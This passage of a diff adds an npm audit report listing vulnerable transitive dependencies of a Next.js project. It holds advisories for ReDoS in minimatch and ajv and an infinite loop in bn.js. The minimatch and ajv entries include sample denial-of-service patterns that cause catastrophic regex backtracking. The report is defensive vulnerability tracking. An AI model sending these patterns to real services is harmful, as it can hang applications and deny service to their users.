+            ". > eslint-config-next@14.2.35 > eslint-import-resolver-typescript@3.10.1 > eslint-plugin-import@2.32.0 > @typescript-eslint/parser@7.18.0 > eslint@8.57.1 > minimatch@3.1.2",
+            ". > eslint-config-next@14.2.35 > eslint-plugin-import@2.32.0 > eslint@8.57.1 > @eslint/eslintrc@2.1.4 > minimatch@3.1.2",
+            ". > eslint-config-next@14.2.35 > eslint-plugin-import@2.32.0 > eslint@8.57.1 > @humanwhocodes/config-array@0.13.0 > minimatch@3.1.2",
+            ". > eslint-config-next@14.2.35 > eslint-plugin-import@2.32.0 > eslint@8.57.1 > file-entry-cache@6.0.1 > flat-cache@3.2.0 > rimraf@3.0.2 > glob@7.2.3 > minimatch@3.1.2",
+            ". > eslint-config-next@14.2.35 > eslint-plugin-import@2.32.0 > eslint@8.57.1 > minimatch@3.1.2",
+            ". > eslint-config-next@14.2.35 > eslint-plugin-import@2.32.0 > eslint-module-utils@2.12.1 > @typescript-eslint/parser@7.18.0 > eslint@8.57.1 > @eslint/eslintrc@2.1.4 > minimatch@3.1.2",
+            ". > eslint-config-next@14.2.35 > eslint-plugin-import@2.32.0 > eslint-module-utils@2.12.1 > @typescript-eslint/parser@7.18.0 > eslint@8.57.1 > @humanwhocodes/config-array@0.13.0 > minimatch@3.1.2",
+            ". > eslint-config-next@14.2.35 > eslint-plugin-import@2.32.0 > eslint-module-utils@2.12.1 > @typescript-eslint/parser@7.18.0 > eslint@8.57.1 > file-entry-cache@6.0.1 > flat-cache@3.2.0 > rimraf@3.0.2 > glob@7.2.3 > minimatch@3.1.2",
+            ". > eslint-config-next@14.2.35 > eslint-plugin-import@2.32.0 > eslint-module-utils@2.12.1 > @typescript-eslint/parser@7.18.0 > eslint@8.57.1 > minimatch@3.1.2",
+            ". > eslint-config-next@14.2.35 > eslint-plugin-import@2.32.0 > eslint-module-utils@2.12.1 > eslint@8.57.1 > @eslint/eslintrc@2.1.4 > minimatch@3.1.2",
+            ". > eslint-config-next@14.2.35 > eslint-plugin-import@2.32.0 > eslint-module-utils@2.12.1 > eslint@8.57.1 > @humanwhocodes/config-array@0.13.0 > minimatch@3.1.2",
+            ". > eslint-config-next@14.2.35 > eslint-plugin-import@2.32.0 > eslint-module-utils@2.12.1 > eslint@8.57.1 > file-entry-cache@6.0.1 > flat-cache@3.2.0 > rimraf@3.0.2 > glob@7.2.3 > minimatch@3.1.2",
+            ". > eslint-config-next@14.2.35 > eslint-plugin-import@2.32.0 > eslint-module-utils@2.12.1 > eslint@8.57.1 > minimatch@3.1.2",
+            ". > eslint-config-next@14.2.35 > eslint-plugin-import@2.32.0 > minimatch@3.1.2",
+            ". > eslint-config-next@14.2.35 > eslint-plugin-import@2.32.0 > @typescript-eslint/parser@7.18.0 > eslint@8.57.1 > @eslint/eslintrc@2.1.4 > minimatch@3.1.2",
+            ". > eslint-config-next@14.2.35 > eslint-plugin-import@2.32.0 > @typescript-eslint/parser@7.18.0 > eslint@8.57.1 > @humanwhocodes/config-array@0.13.0 > minimatch@3.1.2",
+            ". > eslint-config-next@14.2.35 > eslint-plugin-import@2.32.0 > @typescript-eslint/parser@7.18.0 > eslint@8.57.1 > file-entry-cache@6.0.1 > flat-cache@3.2.0 > rimraf@3.0.2 > glob@7.2.3 > minimatch@3.1.2",
+            ". > eslint-config-next@14.2.35 > eslint-plugin-import@2.32.0 > @typescript-eslint/parser@7.18.0 > eslint@8.57.1 > minimatch@3.1.2",
+            ". > eslint-config-next@14.2.35 > eslint-plugin-jsx-a11y@6.10.2 > eslint@8.57.1 > @eslint/eslintrc@2.1.4 > minimatch@3.1.2",
+            ". > eslint-config-next@14.2.35 > eslint-plugin-jsx-a11y@6.10.2 > eslint@8.57.1 > @humanwhocodes/config-array@0.13.0 > minimatch@3.1.2",
+            ". > eslint-config-next@14.2.35 > eslint-plugin-jsx-a11y@6.10.2 > eslint@8.57.1 > file-entry-cache@6.0.1 > flat-cache@3.2.0 > rimraf@3.0.2 > glob@7.2.3 > minimatch@3.1.2",
+            ". > eslint-config-next@14.2.35 > eslint-plugin-jsx-a11y@6.10.2 > eslint@8.57.1 > minimatch@3.1.2",
+            ". > eslint-config-next@14.2.35 > eslint-plugin-jsx-a11y@6.10.2 > minimatch@3.1.2",
+            ". > eslint-config-next@14.2.35 > eslint-plugin-react@7.37.5 > eslint@8.57.1 > @eslint/eslintrc@2.1.4 > minimatch@3.1.2",
+            ". > eslint-config-next@14.2.35 > eslint-plugin-react@7.37.5 > eslint@8.57.1 > @humanwhocodes/config-array@0.13.0 > minimatch@3.1.2",
+            ". > eslint-config-next@14.2.35 > eslint-plugin-react@7.37.5 > eslint@8.57.1 > file-entry-cache@6.0.1 > flat-cache@3.2.0 > rimraf@3.0.2 > glob@7.2.3 > minimatch@3.1.2",
+            ". > eslint-config-next@14.2.35 > eslint-plugin-react@7.37.5 > eslint@8.57.1 > minimatch@3.1.2",
+            ". > eslint-config-next@14.2.35 > eslint-plugin-react@7.37.5 > minimatch@3.1.2",
+            ". > eslint-config-next@14.2.35 > eslint-plugin-react-hooks@5.0.0-canary-7118f5dd7-20230705 > eslint@8.57.1 > @eslint/eslintrc@2.1.4 > minimatch@3.1.2",
+            ". > eslint-config-next@14.2.35 > eslint-plugin-react-hooks@5.0.0-canary-7118f5dd7-20230705 > eslint@8.57.1 > @humanwhocodes/config-array@0.13.0 > minimatch@3.1.2",
+            ". > eslint-config-next@14.2.35 > eslint-plugin-react-hooks@5.0.0-canary-7118f5dd7-20230705 > eslint@8.57.1 > file-entry-cache@6.0.1 > flat-cache@3.2.0 > rimraf@3.0.2 > glob@7.2.3 > minimatch@3.1.2",
+            ". > eslint-config-next@14.2.35 > eslint-plugin-react-hooks@5.0.0-canary-7118f5dd7-20230705 > eslint@8.57.1 > minimatch@3.1.2"
+          ]
+        },
+        {
+          "version": "9.0.5",
+          "paths": [
+            ". > resend@3.5.0 > @react-email/render@0.0.16 > js-beautify@1.15.4 > glob@10.5.0 > minimatch@9.0.5",
+            ". > @typescript-eslint/eslint-plugin@7.18.0 > @typescript-eslint/parser@7.18.0 > @typescript-eslint/typescript-estree@7.18.0 > minimatch@9.0.5",
+            ". > @typescript-eslint/eslint-plugin@7.18.0 > @typescript-eslint/type-utils@7.18.0 > @typescript-eslint/typescript-estree@7.18.0 > minimatch@9.0.5",
+            ". > @typescript-eslint/eslint-plugin@7.18.0 > @typescript-eslint/type-utils@7.18.0 > @typescript-eslint/utils@7.18.0 > @typescript-eslint/typescript-estree@7.18.0 > minimatch@9.0.5",
+            ". > @typescript-eslint/eslint-plugin@7.18.0 > @typescript-eslint/utils@7.18.0 > @typescript-eslint/typescript-estree@7.18.0 > minimatch@9.0.5",
+            ". > @typescript-eslint/parser@7.18.0 > @typescript-eslint/typescript-estree@7.18.0 > minimatch@9.0.5",
+            ". > eslint-config-next@14.2.35 > @next/eslint-plugin-next@14.2.35 > glob@10.3.10 > minimatch@9.0.5",
+            ". > eslint-config-next@14.2.35 > @typescript-eslint/eslint-plugin@7.18.0 > @typescript-eslint/parser@7.18.0 > @typescript-eslint/typescript-estree@7.18.0 > minimatch@9.0.5",
+            ". > eslint-config-next@14.2.35 > @typescript-eslint/eslint-plugin@7.18.0 > @typescript-eslint/type-utils@7.18.0 > @typescript-eslint/typescript-estree@7.18.0 > minimatch@9.0.5",
+            ". > eslint-config-next@14.2.35 > @typescript-eslint/eslint-plugin@7.18.0 > @typescript-eslint/type-utils@7.18.0 > @typescript-eslint/utils@7.18.0 > @typescript-eslint/typescript-estree@7.18.0 > minimatch@9.0.5",
+            ". > eslint-config-next@14.2.35 > @typescript-eslint/eslint-plugin@7.18.0 > @typescript-eslint/utils@7.18.0 > @typescript-eslint/typescript-estree@7.18.0 > minimatch@9.0.5",
+            ". > eslint-config-next@14.2.35 > @typescript-eslint/parser@7.18.0 > @typescript-eslint/typescript-estree@7.18.0 > minimatch@9.0.5",
+            ". > eslint-config-next@14.2.35 > eslint-import-resolver-typescript@3.10.1 > eslint-plugin-import@2.32.0 > eslint-module-utils@2.12.1 > @typescript-eslint/parser@7.18.0 > @typescript-eslint/typescript-estree@7.18.0 > minimatch@9.0.5",
+            ". > eslint-config-next@14.2.35 > eslint-import-resolver-typescript@3.10.1 > eslint-plugin-import@2.32.0 > @typescript-eslint/parser@7.18.0 > @typescript-eslint/typescript-estree@7.18.0 > minimatch@9.0.5",
+            ". > eslint-config-next@14.2.35 > eslint-plugin-import@2.32.0 > eslint-module-utils@2.12.1 > @typescript-eslint/parser@7.18.0 > @typescript-eslint/typescript-estree@7.18.0 > minimatch@9.0.5",
+            ". > eslint-config-next@14.2.35 > eslint-plugin-import@2.32.0 > @typescript-eslint/parser@7.18.0 > @typescript-eslint/typescript-estree@7.18.0 > minimatch@9.0.5"
+          ]
+        },
+        {
+          "version": "9.0.1",
+          "paths": [
+            ". > resend@3.5.0 > @react-email/render@0.0.16 > js-beautify@1.15.4 > editorconfig@1.0.4 > minimatch@9.0.1"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/isaacs/minimatch/security/advisories/GHSA-3ppc-4f35-3m26\n- https://github.com/isaacs/minimatch/commit/2e111f3a79abc00fa73110195de2c0f2351904f5\n- https://nvd.nist.gov/vuln/detail/CVE-2026-26996\n- https://github.com/advisories/GHSA-3ppc-4f35-3m26",
+      "created": "2026-02-18T22:38:11.000Z",
+      "id": 1113371,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n`minimatch` is vulnerable to Regular Expression Denial of Service (ReDoS) when a glob pattern contains many consecutive `*` wildcards followed by a literal character that doesn't appear in the test string. Each `*` compiles to a separate `[^/]*?` regex group, and when the match fails, V8's regex engine backtracks exponentially across all possible splits.\n\nThe time complexity is O(4^N) where N is the number of `*` characters. With N=15, a single `minimatch()` call takes ~2 seconds. With N=34, it hangs effectively forever.\n\n\n### Details\n_Give all details on the vulnerability. Pointing to the incriminated source code is very helpful for the maintainer._\n\n### PoC\nWhen minimatch compiles a glob pattern, each `*` becomes `[^/]*?` in the generated regex. For a pattern like `***************X***`:\n\n```\n/^(?!\\.)[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?X[^/]*?[^/]*?[^/]*?$/\n```\n\nWhen the test string doesn't contain `X`, the regex engine must try every possible way to distribute the characters across all the `[^/]*?` groups before concluding no match exists. With N groups and M characters, this is O(C(N+M, N)) — exponential.\n### Impact\nAny application that passes user-controlled strings to `minimatch()` as the pattern argument is vulnerable to DoS. This includes:\n- File search/filter UIs that accept glob patterns\n- `.gitignore`-style filtering with user-defined rules\n- Build tools that accept glob configuration\n- Any API that exposes glob matching to untrusted input",
+      "reported_by": null,
+      "title": "minimatch has a ReDoS via repeated wildcards with non-matching literal in pattern",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-26996"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "minimatch",
+      "vulnerable_versions": "<10.2.1",
+      "github_advisory_id": "GHSA-3ppc-4f35-3m26",
+      "recommendation": "Upgrade to version 10.2.1 or later",
+      "patched_versions": ">=10.2.1",
+      "updated": "2026-02-20T16:52:16.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-1333"
+      ],
+      "url": "https://github.com/advisories/GHSA-3ppc-4f35-3m26"
+    },
+    "1113398": {
+      "findings": [
+        {
+          "version": "6.12.6",
+          "paths": [
+            ". > @storybook/nextjs@8.6.15 > @storybook/builder-webpack5@8.6.15 > fork-ts-checker-webpack-plugin@8.0.0 > schema-utils@3.3.0 > ajv@6.12.6",
+            ". > @storybook/nextjs@8.6.15 > @storybook/builder-webpack5@8.6.15 > fork-ts-checker-webpack-plugin@8.0.0 > schema-utils@3.3.0 > ajv-keywords@3.5.2 > ajv@6.12.6",
+            ". > @typescript-eslint/eslint-plugin@7.18.0 > @typescript-eslint/parser@7.18.0 > eslint@8.57.1 > @eslint/eslintrc@2.1.4 > ajv@6.12.6",
+            ". > @typescript-eslint/eslint-plugin@7.18.0 > @typescript-eslint/parser@7.18.0 > eslint@8.57.1 > ajv@6.12.6",
+            ". > @typescript-eslint/eslint-plugin@7.18.0 > @typescript-eslint/type-utils@7.18.0 > @typescript-eslint/utils@7.18.0 > eslint@8.57.1 > @eslint/eslintrc@2.1.4 > ajv@6.12.6",
+            ". > @typescript-eslint/eslint-plugin@7.18.0 > @typescript-eslint/type-utils@7.18.0 > @typescript-eslint/utils@7.18.0 > eslint@8.57.1 > ajv@6.12.6",
+            ". > @typescript-eslint/eslint-plugin@7.18.0 > @typescript-eslint/type-utils@7.18.0 > eslint@8.57.1 > @eslint/eslintrc@2.1.4 > ajv@6.12.6",
+            ". > @typescript-eslint/eslint-plugin@7.18.0 > @typescript-eslint/type-utils@7.18.0 > eslint@8.57.1 > ajv@6.12.6",
+            ". > @typescript-eslint/eslint-plugin@7.18.0 > @typescript-eslint/utils@7.18.0 > eslint@8.57.1 > @eslint/eslintrc@2.1.4 > ajv@6.12.6",
+            ". > @typescript-eslint/eslint-plugin@7.18.0 > @typescript-eslint/utils@7.18.0 > eslint@8.57.1 > ajv@6.12.6",
+            ". > @typescript-eslint/eslint-plugin@7.18.0 > eslint@8.57.1 > @eslint/eslintrc@2.1.4 > ajv@6.12.6",
+            ". > @typescript-eslint/eslint-plugin@7.18.0 > eslint@8.57.1 > ajv@6.12.6",
+            ". > @typescript-eslint/parser@7.18.0 > eslint@8.57.1 > @eslint/eslintrc@2.1.4 > ajv@6.12.6",
+            ". > @typescript-eslint/parser@7.18.0 > eslint@8.57.1 > ajv@6.12.6",
+            ". > eslint@8.57.1 > @eslint/eslintrc@2.1.4 > ajv@6.12.6",
+            ". > eslint@8.57.1 > ajv@6.12.6",
+            ". > eslint-config-next@14.2.35 > @typescript-eslint/eslint-plugin@7.18.0 > @typescript-eslint/parser@7.18.0 > eslint@8.57.1 > @eslint/eslintrc@2.1.4 > ajv@6.12.6",
+            ". > eslint-config-next@14.2.35 > @typescript-eslint/eslint-plugin@7.18.0 > @typescript-eslint/parser@7.18.0 > eslint@8.57.1 > ajv@6.12.6",
+            ". > eslint-config-next@14.2.35 > @typescript-eslint/eslint-plugin@7.18.0 > @typescript-eslint/type-utils@7.18.0 > @typescript-eslint/utils@7.18.0 > eslint@8.57.1 > @eslint/eslintrc@2.1.4 > ajv@6.12.6",
+            ". > eslint-config-next@14.2.35 > @typescript-eslint/eslint-plugin@7.18.0 > @typescript-eslint/type-utils@7.18.0 > @typescript-eslint/utils@7.18.0 > eslint@8.57.1 > ajv@6.12.6",
+            ". > eslint-config-next@14.2.35 > @typescript-eslint/eslint-plugin@7.18.0 > @typescript-eslint/type-utils@7.18.0 > eslint@8.57.1 > @eslint/eslintrc@2.1.4 > ajv@6.12.6",
+            ". > eslint-config-next@14.2.35 > @typescript-eslint/eslint-plugin@7.18.0 > @typescript-eslint/type-utils@7.18.0 > eslint@8.57.1 > ajv@6.12.6",
+            ". > eslint-config-next@14.2.35 > @typescript-eslint/eslint-plugin@7.18.0 > @typescript-eslint/utils@7.18.0 > eslint@8.57.1 > @eslint/eslintrc@2.1.4 > ajv@6.12.6",
+            ". > eslint-config-next@14.2.35 > @typescript-eslint/eslint-plugin@7.18.0 > @typescript-eslint/utils@7.18.0 > eslint@8.57.1 > ajv@6.12.6",
+            ". > eslint-config-next@14.2.35 > @typescript-eslint/eslint-plugin@7.18.0 > eslint@8.57.1 > @eslint/eslintrc@2.1.4 > ajv@6.12.6",
+            ". > eslint-config-next@14.2.35 > @typescript-eslint/eslint-plugin@7.18.0 > eslint@8.57.1 > ajv@6.12.6",
+            ". > eslint-config-next@14.2.35 > @typescript-eslint/parser@7.18.0 > eslint@8.57.1 > @eslint/eslintrc@2.1.4 > ajv@6.12.6",
+            ". > eslint-config-next@14.2.35 > @typescript-eslint/parser@7.18.0 > eslint@8.57.1 > ajv@6.12.6",
+            ". > eslint-config-next@14.2.35 > eslint@8.57.1 > @eslint/eslintrc@2.1.4 > ajv@6.12.6",
+            ". > eslint-config-next@14.2.35 > eslint@8.57.1 > ajv@6.12.6",
+            ". > eslint-config-next@14.2.35 > eslint-import-resolver-typescript@3.10.1 > eslint@8.57.1 > @eslint/eslintrc@2.1.4 > ajv@6.12.6",
+            ". > eslint-config-next@14.2.35 > eslint-import-resolver-typescript@3.10.1 > eslint@8.57.1 > ajv@6.12.6",
+            ". > eslint-config-next@14.2.35 > eslint-import-resolver-typescript@3.10.1 > eslint-plugin-import@2.32.0 > eslint@8.57.1 > @eslint/eslintrc@2.1.4 > ajv@6.12.6",
+            ". > eslint-config-next@14.2.35 > eslint-import-resolver-typescript@3.10.1 > eslint-plugin-import@2.32.0 > eslint@8.57.1 > ajv@6.12.6",
+            ". > eslint-config-next@14.2.35 > eslint-import-resolver-typescript@3.10.1 > eslint-plugin-import@2.32.0 > eslint-module-utils@2.12.1 > @typescript-eslint/parser@7.18.0 > eslint@8.57.1 > @eslint/eslintrc@2.1.4 > ajv@6.12.6",
+            ". > eslint-config-next@14.2.35 > eslint-import-resolver-typescript@3.10.1 > eslint-plugin-import@2.32.0 > eslint-module-utils@2.12.1 > @typescript-eslint/parser@7.18.0 > eslint@8.57.1 > ajv@6.12.6",
+            ". > eslint-config-next@14.2.35 > eslint-import-resolver-typescript@3.10.1 > eslint-plugin-import@2.32.0 > eslint-module-utils@2.12.1 > eslint@8.57.1 > @eslint/eslintrc@2.1.4 > ajv@6.12.6",
+            ". > eslint-config-next@14.2.35 > eslint-import-resolver-typescript@3.10.1 > eslint-plugin-import@2.32.0 > eslint-module-utils@2.12.1 > eslint@8.57.1 > ajv@6.12.6",
+            ". > eslint-config-next@14.2.35 > eslint-import-resolver-typescript@3.10.1 > eslint-plugin-import@2.32.0 > @typescript-eslint/parser@7.18.0 > eslint@8.57.1 > @eslint/eslintrc@2.1.4 > ajv@6.12.6",
+            ". > eslint-config-next@14.2.35 > eslint-import-resolver-typescript@3.10.1 > eslint-plugin-import@2.32.0 > @typescript-eslint/parser@7.18.0 > eslint@8.57.1 > ajv@6.12.6",
+            ". > eslint-config-next@14.2.35 > eslint-plugin-import@2.32.0 > eslint@8.57.1 > @eslint/eslintrc@2.1.4 > ajv@6.12.6",
+            ". > eslint-config-next@14.2.35 > eslint-plugin-import@2.32.0 > eslint@8.57.1 > ajv@6.12.6",
+            ". > eslint-config-next@14.2.35 > eslint-plugin-import@2.32.0 > eslint-module-utils@2.12.1 > @typescript-eslint/parser@7.18.0 > eslint@8.57.1 > @eslint/eslintrc@2.1.4 > ajv@6.12.6",
+            ". > eslint-config-next@14.2.35 > eslint-plugin-import@2.32.0 > eslint-module-utils@2.12.1 > @typescript-eslint/parser@7.18.0 > eslint@8.57.1 > ajv@6.12.6",
+            ". > eslint-config-next@14.2.35 > eslint-plugin-import@2.32.0 > eslint-module-utils@2.12.1 > eslint@8.57.1 > @eslint/eslintrc@2.1.4 > ajv@6.12.6",
+            ". > eslint-config-next@14.2.35 > eslint-plugin-import@2.32.0 > eslint-module-utils@2.12.1 > eslint@8.57.1 > ajv@6.12.6",
+            ". > eslint-config-next@14.2.35 > eslint-plugin-import@2.32.0 > @typescript-eslint/parser@7.18.0 > eslint@8.57.1 > @eslint/eslintrc@2.1.4 > ajv@6.12.6",
+            ". > eslint-config-next@14.2.35 > eslint-plugin-import@2.32.0 > @typescript-eslint/parser@7.18.0 > eslint@8.57.1 > ajv@6.12.6",
+            ". > eslint-config-next@14.2.35 > eslint-plugin-jsx-a11y@6.10.2 > eslint@8.57.1 > @eslint/eslintrc@2.1.4 > ajv@6.12.6",
+            ". > eslint-config-next@14.2.35 > eslint-plugin-jsx-a11y@6.10.2 > eslint@8.57.1 > ajv@6.12.6",
+            ". > eslint-config-next@14.2.35 > eslint-plugin-react@7.37.5 > eslint@8.57.1 > @eslint/eslintrc@2.1.4 > ajv@6.12.6",
+            ". > eslint-config-next@14.2.35 > eslint-plugin-react@7.37.5 > eslint@8.57.1 > ajv@6.12.6",
+            ". > eslint-config-next@14.2.35 > eslint-plugin-react-hooks@5.0.0-canary-7118f5dd7-20230705 > eslint@8.57.1 > @eslint/eslintrc@2.1.4 > ajv@6.12.6",
+            ". > eslint-config-next@14.2.35 > eslint-plugin-react-hooks@5.0.0-canary-7118f5dd7-20230705 > eslint@8.57.1 > ajv@6.12.6"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2025-69873\n- https://github.com/EthanKim88/ethan-cve-disclosures/blob/main/CVE-2025-69873-ajv-ReDoS.md\n- https://github.com/ajv-validator/ajv/pull/2586\n- https://github.com/ajv-validator/ajv/commit/720a23fa453ffae8340e92c9b0fe886c54cfe0d5\n- https://github.com/ajv-validator/ajv/releases/tag/v8.18.0\n- https://github.com/ajv-validator/ajv/pull/2588\n- https://github.com/ajv-validator/ajv/releases/tag/v6.14.0\n- https://github.com/advisories/GHSA-2g4f-4pwh-qvx6",
+      "created": "2026-02-11T21:30:39.000Z",
+      "id": 1113398,
+      "npm_advisory_id": null,
+      "overview": "ajv (Another JSON Schema Validator) through version 8.17.1 is vulnerable to Regular Expression Denial of Service (ReDoS) when the `$data` option is enabled. The pattern keyword accepts runtime data via JSON Pointer syntax (`$data` reference), which is passed directly to the JavaScript `RegExp()` constructor without validation. An attacker can inject a malicious regex pattern (e.g., `\\\"^(a|a)*$\\\"`) combined with crafted input to cause catastrophic backtracking. A 31-character payload causes approximately 44 seconds of CPU blocking, with each additional character doubling execution time. This enables complete denial of service with a single HTTP request against any API using ajv with `$data`: true for dynamic schema validation.",
+      "reported_by": null,
+      "title": "ajv has ReDoS when using `$data` option",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-69873"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "ajv",
+      "vulnerable_versions": "<6.14.0",
+      "github_advisory_id": "GHSA-2g4f-4pwh-qvx6",
+      "recommendation": "Upgrade to version 6.14.0 or later",
+      "patched_versions": ">=6.14.0",
+      "updated": "2026-02-20T20:59:14.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-400"
+      ],
+      "url": "https://github.com/advisories/GHSA-2g4f-4pwh-qvx6"
+    },
+    "1113402": {
+      "findings": [
+        {
+          "version": "5.2.2",
+          "paths": [
+            ". > @storybook/nextjs@8.6.15 > node-polyfill-webpack-plugin@2.0.1 > crypto-browserify@3.12.1 > browserify-sign@4.2.5 > bn.js@5.2.2",
+            ". > @storybook/nextjs@8.6.15 > node-polyfill-webpack-plugin@2.0.1 > crypto-browserify@3.12.1 > browserify-sign@4.2.5 > browserify-rsa@4.1.1 > bn.js@5.2.2",
+            ". > @storybook/nextjs@8.6.15 > node-polyfill-webpack-plugin@2.0.1 > crypto-browserify@3.12.1 > public-encrypt@4.0.3 > browserify-rsa@4.1.1 > bn.js@5.2.2"
+          ]
+        },
+        {
+          "version": "4.12.2",
+          "paths": [
+            ". > @storybook/nextjs@8.6.15 > node-polyfill-webpack-plugin@2.0.1 > crypto-browserify@3.12.1 > browserify-sign@4.2.5 > elliptic@6.6.1 > bn.js@4.12.2",
+            ". > @storybook/nextjs@8.6.15 > node-polyfill-webpack-plugin@2.0.1 > crypto-browserify@3.12.1 > browserify-sign@4.2.5 > parse-asn1@5.1.9 > asn1.js@4.10.1 > bn.js@4.12.2",
+            ". > @storybook/nextjs@8.6.15 > node-polyfill-webpack-plugin@2.0.1 > crypto-browserify@3.12.1 > create-ecdh@4.0.4 > bn.js@4.12.2",
+            ". > @storybook/nextjs@8.6.15 > node-polyfill-webpack-plugin@2.0.1 > crypto-browserify@3.12.1 > create-ecdh@4.0.4 > elliptic@6.6.1 > bn.js@4.12.2",
+            ". > @storybook/nextjs@8.6.15 > node-polyfill-webpack-plugin@2.0.1 > crypto-browserify@3.12.1 > diffie-hellman@5.0.3 > bn.js@4.12.2",
+            ". > @storybook/nextjs@8.6.15 > node-polyfill-webpack-plugin@2.0.1 > crypto-browserify@3.12.1 > diffie-hellman@5.0.3 > miller-rabin@4.0.1 > bn.js@4.12.2",
+            ". > @storybook/nextjs@8.6.15 > node-polyfill-webpack-plugin@2.0.1 > crypto-browserify@3.12.1 > public-encrypt@4.0.3 > bn.js@4.12.2",
+            ". > @storybook/nextjs@8.6.15 > node-polyfill-webpack-plugin@2.0.1 > crypto-browserify@3.12.1 > public-encrypt@4.0.3 > parse-asn1@5.1.9 > asn1.js@4.10.1 > bn.js@4.12.2"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2026-2739\n- https://github.com/indutny/bn.js/issues/186\n- https://github.com/indutny/bn.js/issues/316\n- https://github.com/indutny/bn.js/pull/317\n- https://github.com/indutny/bn.js/commit/33df26b5771e824f303a79ec6407409376baa64b\n- https://gist.github.com/Kr0emer/02370d18328c28b5dd7f9ac880d22a91\n- https://security.snyk.io/vuln/SNYK-JS-BNJS-15274301\n- https://github.com/indutny/bn.js/releases/tag/v5.2.3\n- https://github.com/advisories/GHSA-378v-28hj-76wf",
+      "created": "2026-02-20T06:30:39.000Z",
+      "id": 1113402,
+      "npm_advisory_id": null,
+      "overview": "This affects versions of the package bn.js before 5.2.3. Calling maskn(0) on any BN instance corrupts the internal state, causing toString(), divmod(), and other methods to enter an infinite loop, hanging the process indefinitely.",
+      "reported_by": null,
+      "title": "bn.js affected by an infinite loop",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-2739"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "bn.js",
+      "vulnerable_versions": "<5.2.3",
+      "github_advisory_id": "GHSA-378v-28hj-76wf",
+      "recommendation": "Upgrade to version 5.2.3 or later",
+      "patched_versions": ">=5.2.3",
+      "updated": "2026-02-20T21:18:32.000Z",
+      "cvss": {
+        "score": 5.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
+      },
+      "cwe": [
+        "CWE-835"
+      ],
+      "url": "https://github.com/advisories/GHSA-378v-28hj-76wf"
+    }
+  },
+  "muted": [],
+  "metadata": {
+    "vulnerabilities": {
+      "info": 0,
+      "low": 1,
+      "moderate": 4,
+      "high": 4,
+      "critical": 0
+    },
+    "dependencies": 1280,
+    "devDependencies": 0,
+    "optionalDependencies": 0,
+    "totalDependencies": 1280
+  }
+}
